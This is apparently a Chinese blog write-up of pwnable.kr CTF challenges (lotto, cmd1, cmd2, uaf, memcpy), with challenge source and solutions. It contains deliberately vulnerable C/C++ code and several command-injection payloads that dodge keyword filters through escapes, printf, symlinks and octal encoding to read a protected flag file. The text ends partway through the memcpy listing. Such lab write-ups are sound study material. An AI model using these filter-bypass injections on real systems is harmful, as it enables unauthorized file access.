    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;- nLotto Rule -</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;nlotto is consisted with 6 random natural numbers less than 46</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;your goal is to match lotto numbers as many as you can</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;if you win lottery for *1st place*, you will get reward</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;for more details, follow the link below</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;mathematical chance to win this game is known to be 1/8145060.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>

    <span class="c1">// menu
</span><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">menu</span><span class="p">;</span>

    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">){</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;- Select Menu -</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;1. Play Lotto</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;2. Help</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;3. Exit</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>

        <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">menu</span><span class="p">);</span>

        <span class="k">switch</span><span class="p">(</span><span class="n">menu</span><span class="p">){</span>
            <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
                <span class="n">play</span><span class="p">();</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
                <span class="n">help</span><span class="p">();</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">&#34;bye</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
            <span class="k">default</span><span class="o">:</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">&#34;invalid menu</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
                <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>程序先从标准输入获取六个字符, 再从 /dev/urandom
中经过一系列操作读取六个字符, 当这两组字符相等的时候, 就给我们flag&hellip;&hellip;</p>
<p>帮助贴心地告诉了我们从数学上来讲我们获胜的机会是 <strong>1/8145060</strong></p>
<p>一开始是一脸懵逼的, 甚至想破解 /dev/urandom 的算法, 后来仔细看代码,
发现了一个地方有漏洞</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="c1">// calculate lotto score
</span><span class="c1"></span><span class="kt">int</span> <span class="n">match</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">6</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
    <span class="k">for</span><span class="p">(</span><span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">j</span><span class="o">&lt;</span><span class="mi">6</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">){</span>
        <span class="k">if</span><span class="p">(</span><span class="n">lotto</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="n">submit</span><span class="p">[</span><span class="n">j</span><span class="p">]){</span>
            <span class="n">match</span><span class="o">++</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>这个地方, 本意应该是想实现顺序无关的比较,
结果已经存在过的字符没有过滤&hellip; 导致了我们的输入至少有任意一个在 <code>lotto</code>
数组中出现, 我们就能过关</p>
<p>那就随便试试吧, 我运气很好, 第二次就过了</p>
<p>flag: <code>sorry mom... I FORGOT to check duplicate numbers... :(</code></p>
<h1 id="cmd1">cmd1</h1>
<blockquote>
<p>Mommy! what is PATH environment in Linux?</p>
<p>ssh <a href="mailto:cmd1@pwnable.kr">cmd1@pwnable.kr</a> -p2222 (pw:guest)</p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="kt">int</span> <span class="nf">filter</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">cmd</span><span class="p">){</span>
    <span class="kt">int</span> <span class="n">r</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
    <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&#34;flag&#34;</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
    <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&#34;sh&#34;</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
    <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&#34;tmp&#34;</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
    <span class="k">return</span> <span class="n">r</span><span class="p">;</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span><span class="o">**</span> <span class="n">envp</span><span class="p">){</span>
    <span class="n">putenv</span><span class="p">(</span><span class="s">&#34;PATH=/thankyouverymuch&#34;</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">filter</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">system</span><span class="p">(</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>逻辑很简单, 从命令行参数中获取字符串当做命令执行</p>
<p>但是这个地方过滤了 flag, tmp, sh, 并且更改了path</p>
<p>不难绕过, payload <code>./cmd1 &quot;/bin/cat fla*&quot;</code></p>
<p>flag: <code>mommy now I get what PATH environment is for :)</code></p>
<h1 id="cmd2">cmd2</h1>
<blockquote>
<p>Daddy bought me a system command shell.
but he put some filters to prevent me from playing with it without his permission&hellip;
but I wanna play anytime I want!</p>
<p>ssh <a href="mailto:cmd2@pwnable.kr">cmd2@pwnable.kr</a> -p2222 (pw:flag of cmd1)</p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="kt">int</span> <span class="nf">filter</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">cmd</span><span class="p">){</span>
    <span class="kt">int</span> <span class="n">r</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
    <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&#34;=&#34;</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
    <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&#34;PATH&#34;</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
    <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&#34;export&#34;</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
    <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&#34;/&#34;</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
    <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&#34;`&#34;</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
    <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&#34;flag&#34;</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
    <span class="k">return</span> <span class="n">r</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">extern</span> <span class="kt">char</span><span class="o">**</span> <span class="n">environ</span><span class="p">;</span>
<span class="kt">void</span> <span class="nf">delete_env</span><span class="p">(){</span>
    <span class="kt">char</span><span class="o">**</span> <span class="n">p</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="n">p</span><span class="o">=</span><span class="n">environ</span><span class="p">;</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span> <span class="n">p</span><span class="o">++</span><span class="p">)</span> <span class="n">memset</span><span class="p">(</span><span class="o">*</span><span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="o">*</span><span class="n">p</span><span class="p">));</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span><span class="o">**</span> <span class="n">envp</span><span class="p">){</span>
    <span class="n">delete_env</span><span class="p">();</span>
    <span class="n">putenv</span><span class="p">(</span><span class="s">&#34;PATH=/no_command_execution_until_you_become_a_hacker&#34;</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">filter</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="n">system</span><span class="p">(</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>和上一题是同一类型的, 不过这个过滤有点丧心病狂啊&hellip;</p>
<p>但这次没有过滤tmp, 可以在/tmp下创建一个symbolic link到flag</p>
<p>最终解法: <code>/home/cmd2/cmd2 'read -r a &lt;galf;echo $a'</code></p>
<p>flag: <code>FuN_w1th_5h3ll_v4riabl3s_haha</code></p>
<h2 id="大佬们的解法">大佬们的解法</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">./cmd2 <span class="s2">&#34;read b &lt; fl\ag; echo \$b&#34;</span>
<span class="c1"># 妙啊, 利用转义符巧妙地避开了过滤</span>

<span class="nb">cd</span> / <span class="o">&amp;&amp;</span> /home/cmd2/cmd2 <span class="s1">&#39;$(pwd)&#34;bin&#34;$(pwd)cat $(pwd)&#34;home&#34;$(pwd)&#34;cmd2&#34;$(pwd)&#34;fl&#34;&#34;ag&#34;&#39;</span>
<span class="c1"># woc, NBNB. 没有反斜杠, 我们就创造反斜杠...</span>

./cmd2 <span class="s2">&#34;command -p cat fla*&#34;</span>
<span class="c1"># 涨知识了, 膜</span>

./cmd2 <span class="s1">&#39;$(echo &#34;\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147&#34;)&#39;</span>
<span class="c1"># 社会社会</span>

mkdir /tmp/ca
ln -s /bin/cat /tmp/cat
<span class="nb">cd</span> /tmp/ca
ln -s /home/cmd2/flag f
/home/cmd2/cmd2 <span class="s2">&#34;\${PWD}t f&#34;</span>
<span class="c1"># 全部建symbolic link</span>

/home/cmd2/cmd2 <span class="s1">&#39;set -s&#39;</span>
/bin/cat /home/cmd2/flag
<span class="c1"># 愣是没看懂</span>

./cmd2 <span class="s1">&#39;$(printf \\057bin\\057cat) fl&#34;&#34;ag&#39;</span>

./cmd2 <span class="s1">&#39;$(printf &#34;%b%c%c%c%b%c%c%c%b%b%b%c%c%c%c&#34; &#34;\57&#34; &#34;b&#34; &#34;i&#34; &#34;n&#34; &#34;\57&#34; &#34;c&#34; &#34;a&#34; &#34;t&#34; &#34;\40&#34; &#34;\56&#34; &#34;\57&#34; &#34;f&#34; &#34;l&#34; &#34;a&#34; &#34;g&#34;)&#39;</span>

<span class="nb">echo</span> <span class="s2">&#34;/bin/cat flag&#34;</span> <span class="p">|</span> ./cmd2 <span class="s2">&#34;read myvar; command \$myvar&#34;</span>

./cmd2 <span class="s1">&#39;echo $($(cd .. &amp;&amp; cd .. &amp;&amp; pwd)bin$(cd .. &amp;&amp; cd .. &amp;&amp; pwd)cat fla*)&#39;</span>
</code></pre></td></tr></table>
</div>
</div><h1 id="uaf-todo">uaf (TODO)</h1>
<blockquote>
<p>Mommy, what is Use After Free bug?</p>
<p>ssh <a href="mailto:uaf@pwnable.kr">uaf@pwnable.kr</a> -p2222 (pw:guest)</p>
</blockquote>
<p>刚看完Double Free觉得看不懂还是来做pwnable慢慢练习, 结果就来了这个&hellip;</p>
<p>卧槽这次竟然是C++</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c++" data-lang="c++"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;cstring&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;cstdlib&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="cp"></span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>

<span class="k">class</span> <span class="nc">Human</span><span class="p">{</span>
<span class="k">private</span><span class="o">:</span>
    <span class="k">virtual</span> <span class="kt">void</span> <span class="n">give_shell</span><span class="p">(){</span>
        <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
    <span class="p">}</span>
<span class="k">protected</span><span class="o">:</span>
    <span class="kt">int</span> <span class="n">age</span><span class="p">;</span>
    <span class="n">string</span> <span class="n">name</span><span class="p">;</span>
<span class="k">public</span><span class="o">:</span>
    <span class="k">virtual</span> <span class="kt">void</span> <span class="n">introduce</span><span class="p">(){</span>
        <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;My name is &#34;</span> <span class="o">&lt;&lt;</span> <span class="n">name</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
        <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;I am &#34;</span> <span class="o">&lt;&lt;</span> <span class="n">age</span> <span class="o">&lt;&lt;</span> <span class="s">&#34; years old&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">};</span>

<span class="k">class</span> <span class="nc">Man</span><span class="o">:</span> <span class="k">public</span> <span class="n">Human</span><span class="p">{</span>
<span class="k">public</span><span class="o">:</span>
    <span class="n">Man</span><span class="p">(</span><span class="n">string</span> <span class="n">name</span><span class="p">,</span> <span class="kt">int</span> <span class="n">age</span><span class="p">){</span>
        <span class="k">this</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span><span class="p">;</span>
        <span class="k">this</span><span class="o">-&gt;</span><span class="n">age</span> <span class="o">=</span> <span class="n">age</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">virtual</span> <span class="kt">void</span> <span class="nf">introduce</span><span class="p">(){</span>
        <span class="n">Human</span><span class="o">::</span><span class="n">introduce</span><span class="p">();</span>
        <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;I am a nice guy!&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">};</span>

<span class="k">class</span> <span class="nc">Woman</span><span class="o">:</span> <span class="k">public</span> <span class="n">Human</span><span class="p">{</span>
<span class="k">public</span><span class="o">:</span>
    <span class="n">Woman</span><span class="p">(</span><span class="n">string</span> <span class="n">name</span><span class="p">,</span> <span class="kt">int</span> <span class="n">age</span><span class="p">){</span>
        <span class="k">this</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span><span class="p">;</span>
        <span class="k">this</span><span class="o">-&gt;</span><span class="n">age</span> <span class="o">=</span> <span class="n">age</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">virtual</span> <span class="kt">void</span> <span class="nf">introduce</span><span class="p">(){</span>
        <span class="n">Human</span><span class="o">::</span><span class="n">introduce</span><span class="p">();</span>
        <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;I am a cute girl!&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">};</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
    <span class="n">Human</span><span class="o">*</span> <span class="n">m</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Man</span><span class="p">(</span><span class="s">&#34;Jack&#34;</span><span class="p">,</span> <span class="mi">25</span><span class="p">);</span>
    <span class="n">Human</span><span class="o">*</span> <span class="n">w</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Woman</span><span class="p">(</span><span class="s">&#34;Jill&#34;</span><span class="p">,</span> <span class="mi">21</span><span class="p">);</span>

    <span class="n">size_t</span> <span class="n">len</span><span class="p">;</span>
    <span class="kt">char</span><span class="o">*</span> <span class="n">data</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">op</span><span class="p">;</span>
    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">){</span>
        <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;1. use</span><span class="se">\n</span><span class="s">2. after</span><span class="se">\n</span><span class="s">3. free</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
        <span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">op</span><span class="p">;</span>

        <span class="k">switch</span><span class="p">(</span><span class="n">op</span><span class="p">){</span>
        <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
            <span class="n">m</span><span class="o">-&gt;</span><span class="n">introduce</span><span class="p">();</span>
            <span class="n">w</span><span class="o">-&gt;</span><span class="n">introduce</span><span class="p">();</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
            <span class="n">len</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
            <span class="n">data</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">char</span><span class="p">[</span><span class="n">len</span><span class="p">];</span>
            <span class="n">read</span><span class="p">(</span><span class="n">open</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">O_RDONLY</span><span class="p">),</span> <span class="n">data</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
            <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;your data is allocated&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
            <span class="k">delete</span> <span class="n">m</span><span class="p">;</span>
            <span class="k">delete</span> <span class="n">w</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">default</span><span class="o">:</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h1 id="memcpy">memcpy</h1>
<blockquote>
<p>Are you tired of hacking?, take some rest here.
Just help me out with my small experiment regarding memcpy performance.
after that, flag is yours.</p>
<p><a href="http://pwnable.kr/bin/memcpy.c">http://pwnable.kr/bin/memcpy.c</a></p>
<p>ssh <a href="mailto:memcpy@pwnable.kr">memcpy@pwnable.kr</a> -p2222 (pw:guest)</p>
</blockquote>
<p>看介绍似乎不难? 不过这个解题人数让我有些不放心 = =</p>
<p>readme</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">the compiled binary of &#34;memcpy.c&#34; source code (with real flag) will be executed under memcpy_pwn privilege if you connect to port 9022.
execute the binary by connecting to daemon(nc 0 9022).
</code></pre></td></tr></table>
</div>
</div><p>真实的可执行文件只能通过 <code>nc 0 9022</code> 访问, 下面是 memcpy.c 的源码(消去了flag)</p>
<p>memcpy.c</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
